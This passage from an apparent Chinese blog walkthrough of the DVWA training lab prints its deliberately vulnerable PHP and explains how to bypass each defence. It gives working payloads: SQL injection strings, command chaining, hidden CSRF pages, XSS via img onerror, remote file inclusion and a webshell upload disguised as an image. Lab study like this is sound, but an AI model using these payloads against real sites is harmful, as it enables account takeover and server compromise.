&apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取用户的详细信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 服务器端在low的基础上增加了mysql_real_escape_string()函数，这个函数可以对字符串中的特殊符号进行转义，基本上抵御了sql注入 当然这种抵御方式也不是万能的，通过构造编码也可以绕过 详情请见：http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html 同时$pass也做了md5校验，杜绝了password注入 虽然加入了防爆破机制(sleep(2))，但是2秒的沉睡并不算什么 直接用bp爆破就好了 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = $_REQUEST[ &apos;ip&apos; ]; // 设置黑名单 $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); // 删除黑名单中的值 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 跟low相比也只多了将&amp;&amp;和;这两个字符过滤掉，继续用||命令就好了 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 检查请求来自哪里 if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) { // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 两次输入的密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // 不是可信任的来源 echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; stripos(string,find,start) 查找find在string中出现的位置，没有找到则返回false 服务器想通过检查http包头的Referer参数的值中有没有要访问的主机名来抵御CSRF攻击Referer主要用来让服务器判断来源页面 逻辑是判断Referer参数中有没有目的主机的名，而Referer参数中会把完整的域名写进去，所以绕过的方法很简单，只要攻击者把攻击页面的名字改为目的主机的主机名即可绕过 File Inclusion文件包含 核心代码： &lt;?php // 显示的页面参数值 $file = $_GET[ &apos;page&apos; ]; // 输入检查 $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 可以看见多了一个输入检查，利用str_replace函数讲page的值中的http:\\\\等字符删除但是str_replace这个本身就是有漏洞的，只要重写就可以绕过，比如http:\\\\写成hthttp://tp://，str_replace函数只会删除一个http:\\\\ 其他操作都与low的文件包含一样 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 文件上传路径 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件信息 $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; // 检查是否为img if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // 文件夹是否能移动到新位置 if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // 不能 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // 图片不是Img时 echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; 可以看到，服务器对文件的类型和大小进行了限制，但是只检查了Content-Ytpy这个字段只要用bp抓包，把这个字段的值改为image/png就可以绕过了 也可以利用文件包含的，不管是不是php文件，都会尝试当做php来执行的特性 用工具来包含我们上传的png文件，当然文件的内容是一句话木马 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_POST[&apos;g-recaptcha-response&apos;] ); // 验证是否成功 if( !$resp ) { // 验证失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // 验证成功，检查两次输入的密码是否一致 if( $pass_new == $pass_conf ) { // 显示下一阶段 echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;passed_captcha\\&quot; value=\\&quot;true\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 检查是否做了第一阶段 if( !$_POST[ &apos;passed_captcha&apos; ] ) { $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; } // 检查密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 可以看到，服务器在第二步验证的时候，增加了对passed_captcha的检查，如果第一阶段的验证码通过了，那么passed_captcha就会变成true 本质上跟low级别没什么区别，只要在包中多加一个passed_captcha=true就好了 CSRF也一样，多加一条&lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt; 实际场景中，攻击者不可能知道这个多出来的参数是什么，所以第一步应该要先通过验证并且抓包，观察包中传了什么参数过去 SQL Injectionsql注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_POST[ &apos;id&apos; ]; // 转义sql语句中的特殊字符串 $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; ); // 获取结果集 while( $row = mysqli_fetch_assoc( $result ) ) { // 显示值 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 反馈给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } } ?&gt; 服务器先是使用mysql_real_escape_string函数将单引号以及双引号之类的特殊字符转义掉，再用下拉框来限制用户输入 下拉框很好解决，只要用bp抓包,直接在bp里面改就行 因为是数字型的注入，所以单引号基本用不着，只有在where语句上会用到单引号 将单引号以及单引号里面的内容全部转换成十六进制就可以绕过了，其他步骤同low SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_POST[ &apos;id&apos; ]; // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 连接数据库，并将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // 获取结果集 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 反馈给用户 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } //mysql_close(); } ?&gt; 设置了下拉框限制用户输入，同时也消除了反斜杠之类的字符，但是对注入并没有什么影响 用bp抓包，在bp里改参数就行了 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { $cookie_value = time(); setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; 将SessionID的值改为当前的时间 攻击者做的攻击流程跟low一样，只是多一步预估受害者进入系统的时间 XSS (DOM)核心代码： &lt;?php // 检查是否输入了值 if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { $default = $_GET[&apos;default&apos;]; //不永许脚本标记 if (stripos ($default, &quot;&lt;script&quot;) !== false) { header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 服务器端检查了输入的值是否为空，并且不允许出现script标签，出现了就把默认值改为english 只要在？default中间加一个#就可以绕过了，#后面的值不会传给服务器 或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件 ?default=English&gt;/option&gt;&lt;img src=1 onerror=alert(/xss/)&gt; XSS (Reflected)反射型xss 核心代码： &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // 检查是否输入了值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 获取输入的值 $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // 反馈给用户 echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; str_replace函数将输入的&lt;script&gt;删除 这个函数的绕过很简单，重写或者大小写替换都可以 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // 获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // 净化输入的名称 $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用&lt;b&gt;标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。 用bp抓包，在name里用重写或者大小写就可以绕过了","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect.xyz/tags/dvwa/"}]},{"title":"基于DVWA的web漏洞原理-low","slug":"dvwa-low","date":"2018-07-05T06:28:20.794Z","updated":"2018-07-13T11:17:24.026Z","comments":true,"path":"2018/07/05/dvwa-low/","link":"","permalink":"https://perfect.xyz/2018/07/05/dvwa-low/","excerpt":"php看的我眼睛都瞎了","text":"php看的我眼睛都瞎了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 获取用户名 $user = $_GET[ &apos;username&apos; ]; // 获取密码 $pass = $_GET[ &apos;password&apos; ]; //用md5加密 $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; //将结果保存到结果集中，如果错误，则输出一条错误信息并退出脚本 $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //判断结果集是否为1 if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取数据库中的用户信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 $html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 服务器对输入的username与password没有做限制，这就存在sql注入漏洞 关键点在于&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot; 这条语句 当用户输入的username的值为admin’ or ‘1’=’1时，整条语句就会变为&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;admin&#39; or &#39;1&#39;=&#39;1&#39; AND password = &#39;$pass&#39;;&quot;这条语句的逻辑为当user为admin或者当1=1时，整条语句为真 然而1=1永远为真，所以整条语句为真 语句返回一个true，即1，存到结果集中，这与输入正确的用户名和密码导致的结果是一样的 结果就是攻击者不需要知道admin的密码就登录了admin的账号 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = $_REQUEST[ &apos;ip&apos; ]; // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; stristr（）函数在php中为忽略大小写 php_uname（）函数返回运行php系统有关的信息，参数s为返回系统的名称 原理也是过滤不严，没有对输入的值进行检查 直接在输入的ip地址后面加上&amp;、&amp;&amp;、|、||，加上自己想要执行的命令就行 拼接符号A &amp; B 简单的拼接，AB之间并无制约关系 A &amp;&amp; B A执行成功才会执行B A | B A的输出作为B的输入 A || B A执行失败才会执行B 常用命令ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; CSRF原理CSRF通过伪装来自受信任用户的请求来访问受信任的网站 1.当用户A访问了受信任的网站B 2.在打开B网页没有关闭的情况下又去访问了C 3.C利用A在B中未过期的cookie，发出一些请求代码来访问B 4.这样C就能在A不知情的情况下利用A的身份访问了B 而在上面的核心代码中，服务器收到请求后，只会检查两次输入的密码是否相同，没有任何防御CSRF的机制 利用方法构造urlhttp://localhost:8888/dvwa/vulnerabilities/csrf/password_new=password&amp;password_conf=password&amp;Change=Change#当受害者点击了这个url，他的密码就会被改成password 然而实际运用中，受害者点击这个url之后就会返回一个修改密码成功的界面，所以这个方法并不好用 构造攻击页面在自己的服务器上构造一个html页面 &lt;img src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf/?? password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; 当受害者访问这个页面时，会以为访问了一个失效的url，但实际上密码已经被篡改 File Inclusion文件包含 核心代码： &lt;?php // 传入选择的参数 $file = $_GET[ &apos;page&apos; ]; ?&gt; 核心代码很简单，由用户选择文件，服务器去包含执行这些文件 服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 利用方法构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=phpinfo.php服务器会将phpinfo的内容显示在页面上 远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件 在远程服务xx.xx.xx.xx上上传一个文件phpinfo.php 内容如下 &lt;?php phpinfo (); ?&gt; 构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=heep://xx.xx.xx.xx/phpinfo.php即可访问 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 上传的路径和文件名 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件是否能移动到新位置，用于检查文件是否上传成功 if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // 不能移动 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以移动 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; 对上传的文件没有任何的检查和过滤，只要上传php文件就可以获取服务器的webshell权限 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php //检查验证码是否正确 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) { // 隐藏验证码窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos;], $_POST[&apos;g-recaptcha-response&apos;] ); // 检查输入的验证码是否正确 if( !$resp ) { // 输入的验证码错误 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // 检查输入的两个新密码是否匹配 if( $pass_new == $pass_conf ) { // 两个密码匹配 $html .= &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // 两个密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } //当验证码检查通过 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) { // 隐藏验证窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 检查密码是否匹配 if( $pass_new == $pass_conf ) { // 密码匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; reCAPTCHA验证流程客户端的请求验证码的模块先发送请求到google的服务器上 服务器返回验证码 用户发送验证码到网站的服务器 网站服务器将受到的验证码发给google服务器进行核对 绕过修改参数核心代码中，当step验证码通过时，会将step的值从1修改为2 因为中间没有做其他防护，攻击者要做的事很简单，只要用bp抓包，将step的值修改为2就好了 CSRF构造html &lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 受害者访问这个页面密码就会被改掉 SQL Injection Sourcesql注入 核心代码: &lt;?php if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_REQUEST[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = 